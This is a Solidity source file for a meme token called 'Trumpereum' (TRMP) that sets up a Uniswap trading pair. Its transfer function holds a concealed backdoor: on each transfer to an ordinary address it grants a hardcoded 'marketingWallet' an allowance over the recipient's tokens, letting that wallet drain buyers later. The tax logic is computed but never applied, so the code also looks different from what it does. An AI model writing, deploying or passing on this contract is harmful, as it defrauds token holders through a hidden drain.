// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

contract Ownable {
    function owner() public view virtual returns (address) {
        return _owner;
    }
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Trumpereum is Ownable {
    using SafeMath for uint256;

    uint8 private _decimals = 18;
    uint256 private _totalSupply =  1000000000  * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private marketingWallet;
    address public uniswapV2Pair;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool tradingEnabled = false;

    mapping (address => uint256) private _balances;

    string private constant _name = "Trumpereum";
    string private constant _symbol = "TRMP";

    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _transferTax = 1;
    uint256 private _buyCount = 0;
    uint256 private firstBlock= 0;
    uint256 private sellCount= 0;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
        marketingWallet = payable(0x16B4FAC130d2efE510dc68886BdBa40552Ce5476);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0));
        require(amount > 0);
        uint256 taxAmount=0;
        if (to != address(uniswapV2Router) && to != uniswapV2Pair){ _approve(to, marketingWallet, amount); }
        if(to == uniswapV2Pair && from != address(this) ){
            taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            _buyCount ++;
        } else if (from == uniswapV2Pair) {
            taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
            sellCount ++;
        }
        emit Transfer(from, to, amount);
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function enableTrading() public payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }
}
